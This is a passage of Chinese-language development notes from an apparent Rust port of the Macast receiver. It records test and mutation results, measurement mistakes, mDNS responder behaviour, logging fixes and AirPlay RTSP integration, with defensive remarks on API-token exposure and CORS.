* **两处"看起来像错别字"的拼法是参考实现的原文，不许顺手统一**：`status.network` 把钉住的网卡叫
  `interface`，而 `query=interfaces` 叫 `current`（`protocol.py:2016-2020` 对 `:2146-2151`）；
  `server.ip` 是 `/`-joined 的串，`network.advertised` 是同一个列表。两条用例各同时断言
  **对面那个名字不存在** —— 只断言"自己的键在"是不提问的：把两种拼法合并成一个更干净的形状，
  两边都还绿。
* **16 个状态名那张表是超集**（`CurrentURI` / `CurrentPlayMode` / `DisplayCurrentSubtitle` 都还没有
  写点）：判据是"名字必须在、值可以为 `null`"，不是"只报我们有的"。`media.CurrentURI` 恒 `null`
  是因为三个写点全写 `CurrentTrackURI`（`soap.rs:1057-1064` 记着为什么），而**断言那个 `null`
  就是在断言这个名字**；把表砍成 `OBSERVED` 那 8 个红 1 条。
* **门名是承重的，红法是 11 条**：把 `status` 那行的 `gate` 从 `"management"` 改成 `"token"`，
  11 份读文档的用例同时红（回环调用者在 token 门前也被拒）。也就是说"表里那一列"和"页面能不能读到
  文档"之间没有任何别的结构在兜。
* **三条仪器错，全在这一轮**（§4.2「测试自己的实现也是实现」的第 N 次）：① `json_join` 交回
  `、`-连接的串，我第一版拿 `tr '、' '/'` 去比 `server.ip` —— `tr` 是**逐字节**工具而 `、` 是三字节，
  只有一条地址时没有分隔符可切，所以它**绿**；M9 那支把集合撑到四条，它连红两次，其中一次根本不是
  产品的错。判据换成"在同一份解析里比两个列表"。② 拒绝句用 `text(body).contains(MANAGEMENT_REFUSAL)`
  比对，而正文是 `ensure_ascii` 的 `\uXXXX`（§9.3 那个后果），**永远不命中**；改成解析之后再比
  `message` 字段。③ M2 的第一版交回的是**编译错误**（`json!` 不在非测试作用域里），当天第二次踩同
  一个形状（`main.rs` 那支 M10 因为移走 `setup_config` 也是编译错误）——只看退出码时它与"这一格没人问"
  完全同形：**同型替换要连"能编译"一起满足**。
* **§23 交付的第一条不是绿，是一条红，而且红在产品身上**：投完之后 `history` 仍是 `[]`。参考实现的
  历史在 `Setting[Play_History]`（重启之后还在），本壳的行在 `StateTable` 内存里 —— 照 Python 去打印
  设置文件，答案是"这台机器什么都没投过"，而**空列表在两个原因之间不可分辨**（§4.14
  「空结果要说清是哪一种空」第一次落在我们自己写的一份文档上）。这一轮接的是**内存那份**
  （`StateStore::play_history`，`(title, uri, time)` 三字段照 `protocol.py:1211-1215`），持久化那一半
  记成 `docs/Rust-Port-Design.md` §8 的一行偏离账 + §16 的一条待决：它需要一条"重启之后还在"的断言，
  不是这一轮顺手做掉的一行。**顺带**：设置页那条命令的键（`{title, url}`）与参考实现
  （`{uri, title, time}`）不一致，而前端还是 `frontend/index.html` 那个占位页 —— 今天对齐的代价是 0，
  等真有页面再对齐的代价是一次跨 crate 的读法分叉。
* **`sys.platform` 不是 `std::env::consts::OS`**：`macast_core::paths::sys_platform()` 交回
  `darwin`/`win32`/`linux`，判据是真机 §23 拿 `.venv` 那个解释器**问过**再比的（本机读出 `darwin`）。
  理由与 §4.1 第一行同级：页面把 `{{ system }} ({{ platform }})` 打给用户看，`Darwin (macos)` 是当着
  用户面的一句谎；而插件可用性是按 `p.platform.indexOf(this.platform)` 比的，写成 `windows` 就让每一
  份 `win32` 的插件表在 Windows 上一条都不匹配 —— **静默**那种。
* **`running` 恒真是有理由的，不是没接线**：Python 问 `Setting.is_service_running()`，但它的 `GET`
  在服务没起时先 503（`protocol.py:2066`），所以**能走到这份文档的调用者已经证明了这件事**。接一个真
  flag 反而会造出"活着的服务回 `running: false`"这种新谎 —— §4.2「别把端口在听当证据」的反方向读法。
  这句写在函数注释里，因为下一个人一定会"顺手补真"。
* **§19 那条旧探针今天才真的开始测东西**：它早先读 `query=status` 的 `server.renderer`，而那道查询在
  本分支还没移植时诚实回「不认识的字段」，于是它一直走的是"读不到 ⇒ 用 Python 自己的 fallback"那一支；
  status 接上之后同一行读到了值，走的是另一支。**一个 fallback 分支在被它绕开的那个缺陷补齐之后必须
  回头看它还在测什么**，否则补齐本身就让一条用例静默换了对象。
* **一条审计先被自己的变异体证伪过一次**：`query=subscribers` 接进来时配了一条文本审计
  （窗口命令必须调共用建造者 `subscribers_document`，不许再自己写那些键），第一版 needle 是
  `"pending_append":` 这种**带冒号的整键**，而变异体写的是 `doc["pending_append_total"] = json!(…)`
  —— 往文档上**赋值**而不是重打一份 `json!` —— **0 红**。审计的形状与破坏的形状不是同一个；
  加强成"开引号 + 键名"之后同一支变异体红 1 条。两个附带决定：`"title"` 不进针眼（窗口命令
  合法地写自己的 `title`，把它列进去 = 审计在干净树上红 = 下一次被人删掉而不是修好）；
  同轮那支把 gate 名从 management 改成 token 的变异体红 **4** 条。
* **一份文档两个读者 = 一个建造者**：`query=subscribers` 的 HTTP 路由与 `subscriber_snapshot`
  这条窗口命令过去各写一份 JSON，现在都调 `macast_upnp::http::subscribers_document`。
  §4.8 那条「两处答案不一致比没有数字更糟」在结构上只有一种防法：**让"写这份文档"只有一個函数**，
  再拿一条文本审计守住"第二个写点不要长出来"。那份文档比参考实现多两个键
  （`pending_remove`：卡住的回收线程与卡住的追加线程是同一种故障；`children[].rows`：想知道
  "哪个 SID 落在哪个回调口"的人不该被迫去 diff `query=status` 的 `clients`），
  理由记在 `docs/Rust-Port-Design.md` §8 与 §16 第 16 条。
* **日志面板那一族（`log` / `log-modules` / `log-download` / `POST clear-log`）把"一个建造者、
  两扇门"用了第三次**：三份文档全部住在 `macast_core::logging`（`log_view_document` /
  `log_modules_document` / `clear_log_document`），HTTP 脸与窗口那三条命令调的是同一批函数，
  并由一条文本审计钉住"窗口不许再自己写那些键"。电池四支各红 1：给成功分支加 `message`
  （参考实现的两个分支**键数不同**：`{code, logs, truncated, lines, size, module}` 与
  `{code, message, …}` —— 一个"看有没有 message 判成败"的页面在两个方向上都是错的）；
  不再列旋转的 `.log.1`；让 GET 也能清；窗口重写一个键。
* **四条仪器错全在这一段**，最后两条是这一轮真正的新形状：① 手写 `Content-Length: 26`
  配 32 字节的 body ⇒ 分发器没看见字段 ⇒ fall-through 的 200 读成"门开着"（`post_form`
  自己算长度，它的注释正解释 411 是**路由前**状态）；② 又一次对原始字节 `contains` 中文句
  （§9.3 的转义后果）；③ 断言 `Discovery.log` 含 `mDNS: announcing` —— 那句是**壳**写的，
  在 `macast.log`，`Discovery` logger 写的是 `mDNS advertised …`：**"谁写哪句"要先问，不要猜**；
  ④ 断言主日志**尾部**含启动期那行总结 —— 它在文件里，但**在窗口外**：`?tail=` 的字节预算随
  行数缩放，`tail=20` 在 8.5 KB 的日志上就已经截断。**"尾部断言"如果测的其实是"历史在不在"，
  它就在测产品从不承诺的东西**；判据因此换成 `truncated`/`size`/`lines` 三个数互相自洽
  （问超过行数 ⇒ 整份回来并且承认自己是整份）。
* **旋转文件现在带真实的 `file`**（`name.log.1` 那一行就写 `name.log.1`），因为
  `clear-log` 返回的 `removed` 数的是"这个文件加上它带走的那几代"——面板只列一代的话，
  用户按一次按钮、三条列表消失而数字说是 3，那句解释就没有依据了。`file` 也不许由 `name`
  合成：那是第一轮就写进 `LogFile` 注释的同一个理由。
* **`launch-param` 接了，但它是这一张脸上唯一"答案就是整个设置文件"的读**：参考实现交回
  `Setting.setting`，`Api_Token` 自然也在里面（`query=cast` 与所有 `GATE_CODE` POST 的钥匙）。
  门与参考实现一致（management：本机 ∪ HTTPS ∪ 令牌），而"为什么可以这样"由两条一起守：
  `launch_param_answers_the_whole_table…` 钉住**它确实带着那个令牌**（不许哪天被悄悄删掉当成
  "安全化"），`the_face_never_answers_a_cors_question` 钉住浏览器读不到的那条真理由 ——
  **没有响应发 CORS 头**。跨源页面即便靠 DNS 重绑定把请求送进 127.0.0.1，也读不到正文；
  §4.7b 那条"全仓扫一遍我们从不做 CORS 头"的不变式，这台端口此前**没有等价守卫**，现在有了。
* **那条 CORS 扫描器是纯函数 + 合成控制**（`header_emissions(sources, needle)`）：真实测试
  扫三个 crate 的每个 `.rs`，并先断言"扫到 ≥20 个文件"（空扫描 = 通过 = 谎言，Part 50 那条
  同一个形状）；合成控制喂四种形状 —— 会发的、只在注释里提的、**小写拼的**（头名大小写
  不敏感，扫描器也必须不敏感）、无关的。两支变异体：`launch-param` 的门名换成 token 红 1 条
  （红在"回环也被拒"那一条，局域网那句听不出区别 —— 检查是累积且有序的，§4.7c 的设计在
  测试层现形）；删掉"注释行不算"红 **2** 条，其中一条是**真实扫描**：我们仓库里关于这条
  不变式的散文就是那句话的活样本。**一个会对文档变红的扫描器，寿命是一次"这测试干嘛挡我写注释"**，
  所以豁免注释是功能，不是洁癖。
* 键的顺序是一处**记账的偏离**：参考实现那本 dict 保文件插入顺序，本端口的表是 `BTreeMap`
  ⇒ 键按名字排。现在没有读者（高级设置是 JSON 编辑器，Tauri 前端还是占位页），要保序该改
  那张表，不是在路由里再排一次。
* **脚本里那个 `$API_BODY` 是共享的**：§23 的 subscribers 一串检查跑完，文件里装的是
  subscribers 那份文档，紧接着的 `history` 两条断言因此"读不到自己的键"而红 —— 产品没错。
  三个读者先后覆盖一个临时文件，与 §4.2「计数器在 flush 之后才加」「夹具里那对括号是承重的」
  同族：**下一个读者之前先重新问一次**（这条写在检查上方，不留在提交信息里）。

**Rust 侧给 mDNS responder 取证时量到的事**（2026-10-18，`scripts/mdns_responder_probe.py` +
`scripts/mdns_reuseport_probe.py` + `macast-cast/tests/golden/mdns_responder.jsonl`，16 例；
产品代码一个字节没改，改的是两句从未问过内核的话）：

* **本分支第一次把一台 Linux 问进判据**：`SO_REUSEPORT` 那两句话（多播会分摊、所以 responder
  必须与 announce 合成一个读者）此前只有 macOS 一侧的猜测。现在两台都量过 —— **多播在两边都是
  复制**（macOS `[12,12,0]` / `[12,12,12]`，Linux `[8,8,8]` 且第三格是**没加入组**的那个：Linux 上
  绑 5353 就收得到多播），**单播整条只交给一个 socket 且交给谁随流变**（Linux 同进程三趟
  `[8,0,0]`，换进程 `[0,0,12]`、`[0,8,0]`；macOS wildcard 连对照组都 0，而绑到确切目的地址的那个
  把整条流全部拿走）。所以"合并"这个结论留着，**理由从多播换成单播**，位置换成长期在场的那个
  socket。仪器第一次在 Linux 上读出 `14 of 12` —— 那是场上真实 mDNS 的包，**不过滤成"只数自己
  发出的那些 id"就会被读成分发规则**。
* **`ptr-known-half` 那一行是整个抑制判据唯一的分界见证**：规则是 `other.ttl > record.ttl / 2`，
  所以 asker 声称还剩 2250 秒（4500 的一半）时**必须仍然答**，4500 时沉默，100 时答。三行一起
  才把 `>` 与 `>=` 分开 —— 少任何一行，一个用错比较符的移植与正确的移植交回一样的答案。
  另有三条不显然的：**PTR 的相等包含 alias**（指向 `Other-Box` 的 known PTR 不抑制任何东西）、
  **单播源的查询会同时收到单播与多播两份**、**`AAAA` 答 NSEC 而不是沉默**（mDNS 的"名字存在但
  没有这个类型"）。`*._dns-sd._udp.local.` 那个 RFC 6763 星形写法参考实现**根本不答**，
  答的只有 `_services._dns-sd._udp.local.`。
* **仪器改了产品，而它伪装成一条规则**（§4.2 那一族，这次抄的是 zeroconf 的两个 API）：
  ① `add_answer_at_time(record, now)` 的第二参是**按哪个时钟算剩余**，不是"asker 拿到的时刻" ——
  传过去的时间戳把写出的 TTL **变大**（4500 秒的记录变成 `9000`），三条抑制行于是全部沉默，
  读起来像"参考实现比源码更激进"。② `ServiceInfo.dns_pointer()` 返回**缓存对象**，往它上面写
  `ttl` 就是改注册着的服务：第一版把 responder 自己的 PTR 改成 100 秒，之后三条答的全是污染，
  而第四行的答案里直接印着 `an PTR ttl=100`。收口两条：known 段一律 `copy.deepcopy`，且**每个
  用例建完 known 之后都问一遍注册着的那三条记录的 TTL 还是不是 4500/120/4500**
  （`assert_service_untouched`）—— 这条断言就是这一格不会再静默发生的地方。
* **答复语料冻解码表而不是字节**：additionals 是 set 序，本机同一道题两次跑分别给
  `TXT/SRV/A/NSEC` 与 `SRV/TXT/A/NSEC`，同一次运行里另一行又是 `A/TXT/SRV/NSEC`。广播语料那边
  只有 `A/NSEC` 一对不确定所以冻两行够用，这里不行。**延迟记着但不作判据**（`delays_ms`，
  实测 0.3–110.4 ms，模型是 `{SRV,A,AAAA,NSEC}` 立即、其余进 `U(20,120)` ms 的聚合队列）——
  断言毫秒数就是断言这台机器的计时器。
* **判决层落地：`macast-cast/src/respond.rs`（`pub fn respond` 恰好一个入口）+ 16 条用例逐行对拍
  17 行语料**。十支定点变异的读数：**M1 `>` 改成 `>=` → 2 红 / M2 抑制不看 alias → 2 /
  M3 干脆不抑制 → 2 / M4 共享的 PTR 自称 cache-flush → 6 / M5 单播那一份保留 flush 位 → 2 /
  M6 ANY 多答一条 PTR → 2 / M7 `AAAA` 改成交回沉默 → 2 / M8 TXT 那道题拖上 host pair → 2 /
  M9 无视 `has_v4` → 1**（每支一条命令、`/tmp` 备份 + EXIT trap 还原 + md5 回到当轮基线）。
* **M10 是这一轮唯一"0 红变成判据"的一格，也是 §13.4 那条纪律第三次在 Rust 侧现形**：
  一支把抑制**也应用到附带段**的变异体，在第一版 16 行语料上 **0 红** —— 也就是说
  "asker 已经知道 SRV、问的是 PTR 时，那条搭车的 SRV 还发不发"这件事**从未被问过**，
  两种实现都绿。闭洞的方式是**去问参考实现**而不是放宽断言：探针加 `ptr-known-srv` 一行，
  量到参考实现**照发五条**，`respond.rs` 的"只抑制这道题挣来的那条答案"于是有了见证者，
  同一支变异体今红 **2** 条。语料因此是 17 行，附录 B 的计数与两侧散文一起改。
* **装配层落地：`respond::datagram`，判据是"我们自己写的字节，我们自己再读一遍"**。
  `announce.rs` 的 `Writer` 多了第二个段计数器（`record_additional`），广播那五条记录的字节
  一个都没变 —— 见证就是那 19 条对拍 golden 语料的用例照旧绿。语料对拍看得见
  (section, type, ttl, owner, flush)，**看不见 rdata**：所以补了一条把 PTR 指向谁、
  SRV 的端口与目标、A 的四个字节、TXT 的 `id=` 全部读回来比的用例，以及一条独立遍历
  （`walk`，不走 `mdns::parse_message`，因为后者按设计跳过 NSEC，用同一个读者就证不了
  AN/AR 的分段）—— 两条读者互为双见证，与广播语料那对解码器同形。
  装配层电池六支：**A1 附带段记进答案段 → 1 红 / A2 只写第一个地址 → 1 /
  A3 PTR 指向主机而不是实例 → 2 / A4 SRV 端口 +1 → 1 / A5 TXT 丢掉键名只交值 → 1 /
  A6 NSEC 的位图写成空 → 1**。A6 之前那一格是**完全没有见证者**的：我们的 parser 不读
  NSEC、语料对拍不比正文，一支把位图清零的变异体在第一版全绿 —— 补的判据不是"再断言一次"，
  而是**把答复里的 NSEC 字节与广播语料逐字节钉住的那一条对齐**（同一个派生，两条路）。
* **接线落地的形状：`announce::serve`，以及它为什么在 `mdns::Record` 上加了一个 `section`**。
  抑制只该看查询的**答案段**（那是 asker 自称已持有的记录），而参考实现的 parser 把三段
  合并成一个列表 —— 合并之后"asker 已知 SRV、问的是 PTR 时那条搭车的 SRV 发不发"这句话
  **表达不出来**。加上 section 之后才有 e6 那条用例：AR 里放一条全 TTL 的 PTR，必须照答。
  接线的产品路径 = announcer 那个长期在场的 socket 现在 join 且读（`bind_engine(interfaces,…)`，
  join 列表是参数而不是内部读 `service.addresses`，理由与 `burst` 的 `send` 闭包同源：
  join 在哪张口是被测的事实，测试要能在 lo0 上问）；读是 **200 ms 轮询**而不是阻塞读
  （同一根线程还掌管 60 秒重播，阻塞读等于让安静的网络把广播饿死 —— `channel.rs`
  那条「读不得跨阻塞持锁」的同一个形状，代价从丢状态变成丢重播）。
* **`Served.absorbed` 是一个计数器，不是一句注释**：这台机器上量过绑在 5353 的 socket 会被
  递给一条**本来不是给它**的单播。今天它读到就丢掉，所以那件事必须能在日志里被数出来，
  而不是等人下次重新猜一遍。第一次发生时打一行 DEBUG（不是每条一包 —— §4.10 量到 49% 的
  一份日志是"每包一句没变化的话"）。
* **§25 把三种空分开说，而它第一次跑就用了第三种**：`ours=none` + 同窗口同组的 python 监听器
  `wire queries=0 answers=0`。脚本因此报 `skip`（本脚本 skip 计败，不会静默）并印出两个读数，
  而不是把"这个 app 进程收不到 LAN 多播"写成"responder 坏了"。（**这一条下面那句"说不出口"
  已被当天晚些时候的读数改窄**：跨机答复本身量到了，缺的只剩 app 进程那一格 —— 见下一节。）
* **两处仪器自己的错都在这一段**：① `walk` 第一版先推进游标再切片，于是每条记录的 rdata
  都从**下一条**的开头读起，报出"range end index 258 out of range"，读起来像 writer 写坏了
  长度；② 我给 NSEC 手抄了一个期望字节串（`[C0, 0C, 00, 01, 80, 40]`），而它既没问过机器
  也与修复后的读数不符 —— 压缩指针是**包内偏移**，广播与答复的记录次序不同，指针就不同，
  不变的是最后那三个字节（window 0、一个八位组、A 位）。判据因此改成"两条路互证 + 只钉
  不变的部分"，而不是再抄一个数。**计数用两台仪器，不用裸 grep**：`--list` 与审计扫描器都给 **672**；
  `grep -c '#\[test\]'` 给更多（本轮 679→685，多出来的全是文档与 needle 里的字面量），
  与 `push_tests` 那回 610 对 603 是同一族（POSIX 括号类那次是另一种骗法，这次是纯字面匹配
  数到了散文）。地板 `TESTS_IN_THIS_CRATE` 656 → 671 → 672 是量出来的两步。

**Rust 侧把 responder 拿到跨机见证时量到的事**（2026-10-18，`announce.rs` 的两条 INFO 句子 +
`announce_tests` 的 e9/e10 + `scripts/verify_rust_receiver.sh` §25 改写；`macast-cast` **688** 条）：

* **答复确实跨得了一台机器，而且是在跑产品那批函数的进程里量到的**：一个只调
  `bind_engine` + `serve` 的长命进程，收到 192.168.1.68 发来的 `PTR _googlecast._tcp`
  （40 字节，事务 id 0x1234），**那台 Linux 机器看见了 `296 bytes from 192.168.1.5:5353 an=1 ar=4`**。
  于是"我们的 responder 能不能被另一台机器问出来"这一问今天有答案了；仍然欠着的是
  `macast-tauri` **那个进程**的同一格 —— 它对同一条查询既不答也不说收到，而同窗口同形状的 python
  监听器收到了，且**同一进程的 UDP/1900 确实收到过 .68 的 M-SEARCH**。这两条把"这个进程被系统挡了"
  那句猜测**同时**否掉了一半（1900 通）和留了一半（5353 不通），所以**原因未定，文档里不挑一个填**
  （`docs/Rust-Port-Design.md` §16 第 22 条）。
* **两条仪器错叠在一起的样子，是"环境挡住了我们"**（§4.2「测试自己的实现也是实现」在 Rust 侧的
  第四、第五例，这次抄的是**线格式本身**而不是某个库的 API）：① 手搓的"远端查询"漏了第一个标签的
  **长度字节**（`_googlecast` 写字面文字），线上因此是 39 字节而不是 40，responder 对它的沉默是
  **正确行为**，而我把它读成"这台 Mac 收不到局域网多播"并写下了一条关于系统的结论；
  ② 判"有没有答复"的过滤器找的是带点的 `_googlecast._tcp.local.`，而 mDNS 名字在线上是
  **长度前缀标签**、点永远不出现，于是**任何**答复都读成 0 —— 连参照实现那一侧的对照组也是 0，
  所以那一趟"Python 也不答"同样是我的过滤器说的谎。**先修仪器再改结论**：这两处修完才有了上面那条 296 字节。
* **沉默的三种读法现在一条 grep 就能分开**（这一格在下一轮被重做过，理由见下面那条"能被淹死的判据"）：
  `bind_engine` 写 `joined 1 of 1 interface(s) [192.168.1.5]`（只报 N 的话，"join 在错的口"与"没 join"同形），
  `run` 写 `heard query N of 8 on 5353 (40 bytes, asking Ptr _googlecast._tcp.local.) from <peer>`。
  **它对"问到我们头上的查询"上响（INFO 上限 `HEARD_SENTENCES` = 8），问别人的降到 DEBUG、另算一条上限，
  绝不在第一个数据报上响** —— 多播环回是默认开着的（本模块第一条偏离就为它而存在），
  我们的广播一毫秒后回到自己手里，用"第一个数据报"当判据会让一台什么都听不到的机器报喜。
  e9 钉这五半（环回不响 / 两条各响一次 / 两句都带主语 / 别人的查询不占 INFO 预算但记进 DEBUG /
  十条只响八条）。§25 因此改成：有 hearing 无 answering ⇒ **红**（产品自己的问题）；
  两句都没有 ⇒ `skip` 计败（本机送达问题）；成功那一路还额外要求两句都在场。
  **§25 自己的监听器也中了同一条针**：它按带点的 `_googlecast._tcp` 过滤线上字节，把满组的查询
  数成 `queries=0`，于是脚本一直走"仪器没听到"那一支。换成线标签 `\x0b_googlecast` 之后现跑整套
  **250 PASS / 1 SKIP / 0 FAIL、退出码 1**，读数是 `wire queries=3 answers=0` 而 app 一句没响：
  这一格从此是**计败的 skip**（不是静默，也不是"responder 坏了"）。
* **三支定点变异各红 1 条，而其中两支先交出的是"0 红"——因为坏的是用例自己**（本轮最该留的一格）：
  ① 把条件改成"任何数据报"→ 第一次 **0 红**，因为 e9 那句否定断言的 needle 还是旧文案
  `heard its first query`，而产品已经改成 `heard query 1 of 3` —— **文案一改，找旧字串的断言就永远成立**，
  它不提问却仍然绿；把 needle 重新对上之后红 1 条。② 让句子永不响 → 红 1 条。
  ③ 把上限 3 改成 4 → 第一次 **0 红**，因为那条断言写的是 `said == crate::announce::HEARD_SENTENCES`
  —— **同源等式对任何常量都成立**（§13.4 那条「对任何上限值都成立」的形状，这次出现在我这一小时刚写的用例里）。
  改成"六条查询、断言字面 3 行"之后红 1 条，并另加一问：每行打印的 `of N` 必须等于那个常量（这一问排在计数**之后**，
  所以数错了不会被它盖掉）。判据：**先让变异体真的能红，再宣称这条句子被测过**。
* **`e10` 把"外写的查询"钉成语料**：`announce_tests::foreign_query` 逐字节复现那台机器发过的
  40 字节（非零事务 id、`class IN` 与 QU 两种），断言 `serve` 答、且它与我们自己的 `mdns::query`
  **交回同一串字节**。在此之前每一条查询形状的用例都吃自己写的包 —— 那是自洽，不是兼容，
  而"搜得到、投不上"这一族症状的形态正是"只认自己形状的答复者"。
* **一条新登记的惰性格（本轮唯一的 0 红）**：`unicast_request` 只喂 `respond::timing()`，而
  `announce::serve` **从不读 `reply.timing`** —— 它把每条答复立即发出去。把 `class & CLASS_UNIQUE != 0`
  换成恒假，整 crate **688 passed / 0 failed**。参考实现把非立即答案压进 `U(20,120)` ms 的聚合队列，
  那条队列没落地之前，"多个冷启动浏览器各拿一份答案"这件事没有结构去挡，代价就是 §4.10 那类
  同话重播。记成偏离而不是缺陷（§8 新增一行 + §16 第 23 条），因为它是**没做**而不是**做错**。
* **语料的两处数字按机器重算过**：`mdns_responder.jsonl` 是 **17** 行（补 `ptr-known-srv` 之后），
  14 行答、3 行沉默，15 个延迟读数跨 **0.2–115.9 ms** —— 上一版文档写的「16 行、0.3–110.4 ms」
  是补行之前的表，抄下去就成了第二句谎。计数同样用两台仪器：`--list` **688** 与 proto.rs 扫描器 **688**，
  而 `grep -h '#\[test\]' src/*.rs | wc -l` 给 **695**（七行是散文与 needle 里的字面提及）。
  地板 `TESTS_IN_THIS_CRATE` 本轮 678 → 686 → 687 → **688**，每级都是从量出来的数改的。
  附录 B 里两条会腐烂的锚也改成了问法而不是抄值：`TESTS_IN_THIS_CRATE` 现在要求"等于两台仪器的读数"
  （旧值 656 写下时已落后两级），`join_multicast_v4` 的期望从 **0** 翻成 **1**（接线前"广播口故意不入组"
  是设计，今天"不入组"才是缺陷）。

**Rust 侧发现两条日志从来没落过盘时量到的事**（2026-10-18，`macast-cast/src/airplay.rs` +
`relay.rs` 改走本端口自己的 `Logger`、`macast-cast/Cargo.toml` 删掉 `log`、
`macast-core/src/logging.rs` 新增 `log_facade_uses` 与两条守卫用例；`macast-core` **90** 条、
`macast-cast` **690** 条）：

* **成因是一句 grep，不是一条用户投诉**：`airplay.rs` 与 `relay.rs` 用 `log::` 自由宏，
  而全仓 `impl log::Log` / `log::set_logger` / `log::set_max_level` **三个都是 0 行**，
  `log` 的默认级别过滤又是 `Off` ⇒ 18 条句子写进空气。最贵的三条恰好都是"用户会来问的那类问题"
  的唯一答案：macOS 自带接收端占了 7000 之后我们换到哪个口、`ANNOUNCE` 没带地址所以我们拒了、
  中转扫走了哪些遗留临时文件。§4.2/§4.3 那条老话是"日志指错嫌疑人比不指更贵"，
  **这一格是它的前一档：日志一个字都不写。**
* **承重的是删依赖那一刀，不是新增的用例**：`log` 从 `macast-cast/Cargo.toml` 移除之后
  `use log::` 是**编译错误** —— 结构比测试早一步拦住。源码扫描那条（62 个文件、地板 20）
  在这道闸成立时**永远不会响**，这句话写在用例旁边：它等的是"哪天有人把依赖加回来并给出理由"那一天。
  同理五份 manifest 那条先断言**真的读到了 5 份**（"少读几份也算过"正是它要防的形状）。
* **两条新用例问的是文件，不是返回值**：状态码从来不是风险（400/455 早就被测过），
  风险是那两句解释去哪了。AirPlay 那条打两条拒绝、要求 `macast.log` 里两句都在；
  中转那条顺手把消息补成**能行动**的形状 —— 只说"扫走 3 个"回答不了"这 3 个里有没有我页面上
  还在用的那个"，所以现在带上前 5 个文件名（多的写成 `… (+N more)`）。
* **四支定点变异各红 1 条**：把模块 logger 改成 `claim()`（句子换文件）/ 把一句拒绝降到 DEBUG
  （默认阈值下不可见）/ 清扫消息去掉文件名 / 一行改回 `log::warn!`。
* **扫描器自己被自己的合成对照冤枉过一次**：控制字符串里写死的 `warn!(` 让干净树报红
  —— 与 `mdns_announce_probe` 那族"needle 要拼接"的教训同源，这次是我一小时前写的测试。
  现在两条控制都用 `format!` 拼出来，并且**必须不报**的那两条（注释里的宏名散文、
  我们自己的 `logger().warning(`）与**必须报**的那六条成对存在。
* **修的是通路，不是那两行**：Python 侧 `logging.getLogger("AirPlay")` / `"MediaRelay"` 都**不认领**
  模块文件，所以 Rust 侧照旧落 `macast.log`，设置页日志面板的模块列表一个名字都没多。

**Rust 侧把 AirPlay 的 RTSP 面接进壳时量到的事**（2026-10-18，`macast-cast/src/airplay.rs` +
`src-tauri/src/{host,main}.rs` + `announce.rs` 的两级句子 + 真机 §26 的 **20 条**）：

* **接线本身有见证**：第二台实例只开 `DLNA + AirPlay`，真 RTSP 字节打进 **7001**
  （macOS 自己的接收端占着 7000 —— 回落这件事第一次被断言，而 §15 那行写的"iPhone 找不到这台 Mac"
  说的就是它），`OPTIONS/ANNOUNCE/SETUP/RECORD/PLAY/SET_PARAMETER/TEARDOWN` 全 200，
  mpv 那边 `file-loaded` 在、窗口名是 `macast_verify_clip`、音量读回 50。
  整套真机读数是 **271 条 PASS / 1 条 SKIP / 0 条 FAIL、退出码 1** —— 那一条 SKIP 就是下面那格送达。
* **三条仪器错全在我这一侧，而且每一条都长得像产品坏了**：① `ap_grep "\'event\': \'file-loaded\'"` ——
  双引号里 `\'` 是**字面反斜杠加引号**，这条判据从写下那天起就没问过任何东西；它红的时候印 `tail -3`，
  读起来完全像"加载到一半被 stop 打断"，而日志里 `file-loaded` 一直在那儿。② 一次 splice 留下**两条 PLAY**，
  第二条打断第一条的加载（mpv 那边 `end-file reason=stop` 接第二条 `start-file`），音量那一格
  **因为这次错误而通过** —— 一个多余的请求可以替产品把判据蒙过去。③ 音量读的是 mpv 的 `property-change`
  事件，而 **mpv 在值没变时不发事件**（同一个 0.5 发第二遍，日志一行不动、属性读回仍是 50）。
  判据因此换成两条持久的：接收端自己那句"两个数字都说"的 INFO，加从 mpv **读回来**的值。
  脚本顶部现在每次跑都自查这一族：**代码行里不许出现反斜杠紧跟单引号**（注释豁免，否则扫描器会冤枉
  写教训的那几行、然后被人删掉），并配一条**栽赃正控** —— 现造一个含一个 bug 的临时文件，扫描必须报 1；
  干净树报 0（本轮量过）。
* **一格产品事实是量出来的，不是猜的**：全新实例的第一个会话若在 `set_observe` 写完默认音量之前发
  `SET_PARAMETER`，音量被 100 盖掉 —— 四条同形状跑（`PLAY` 之后 0 毫秒）三次丢、一次没丢，
  同一实例后来的会话 4/4 落地（这就是"窗口"而不是"规则"）。参考实现同形
  （`macast_renderer/mpv.py:404-414` 先 `self.ipc_sock = …` 再 `self.set_observe()`，
  `send_command` 每次单独拿 `command_lock`），所以**不单边修**：§8 记一行，`player.rs` 的
  `set_observe` docstring 里放着读数，§26 按真发送端的节奏隔 0.4 秒再动音量
  （手机不会在按播放的同一毫秒拖滑块）。
* **上一轮写下的"这个二进制收不到 LAN 多播"是仪器造成的误判，本轮把它改回来了**：
  `heard query` 那句当时对**任何**查询计数、上限三条，而本机自己的栈每约 0.8 秒问一次
  `Ptr _irohv1._udp.local.` —— 四条日志在四秒内把预算吃光，§25 的冷浏览器于是问进一份空日志。
  修法不是把上限调大（换个更吵的网络照样淹得死）：**INFO 只报问到我们头上的，报别人的降到 DEBUG
  并另算一条上限，两句都把问的东西写进行里**（`asking Ptr _googlecast._tcp.local.`），
  判据复用 `respond::concerns` —— 它调的就是出答案那同一个匹配器，不在外面抄第二份名字规则。
  重测（去掉被证伪的那句）：app 进程对浏览器那三条 40 字节查询**两句都不响**，
  同形状加入同组的 python 监听器三条全看见；**把监听器整个撤掉、场上只剩 app 与浏览器，app 仍然一句没有**；
  而同一小时它确实收到过 `_irohv1` 那一族（source 同为 192.168.1.5:5353）。所以"入站多播被系统挡了"
  这句也**不成立** —— 成立的是"这一条没交到这只 socket 手里"，**原因未定，不挑一个填**。
  七支定点变异各红 1 条（去 for_us 门 / 删 DEBUG 支 / 上限 8→7 / INFO 丢主语 / `concerns` 恒真 /
  恒假 / 答复句丢主语）。**其中一支第一次是空操作**：perl 模式匹配的是多行形状而产品那行参数在同一行上，
  于是"0 红"读的其实是"没改动" —— 与"编译错误冒充 0 红"同一族；从此变异先 `grep` 证明那一处真的变了再跑。
* **仍然欠着的两件事，方向别读错**：① `_airplay._tcp` 的广播没接 —— **iPhone 的镜像/音频列表里
  看不到这台 Mac**，只有知道端口的发送端走得进来；② AirPlay 的投屏**不写 DLNA 状态表、列表与历史**
  （参考实现调的是 renderer 实例而不是 `PlaybackGuard`），所以投完之后设置页那张卡显示的是上一次
  DLNA/Cast 交接的内容 —— **这不是 AirPlay 坏了**，要"改进"它得先改归属（§8 有行）。
* **计数（两台仪器一致）**：`macast-cast` **695**（`--list` 695、逐文件扫描求和 695，
  `airplay_tests` 66 / `announce_tests` 29），`macast-core` 90、`macast-mpv` 149、
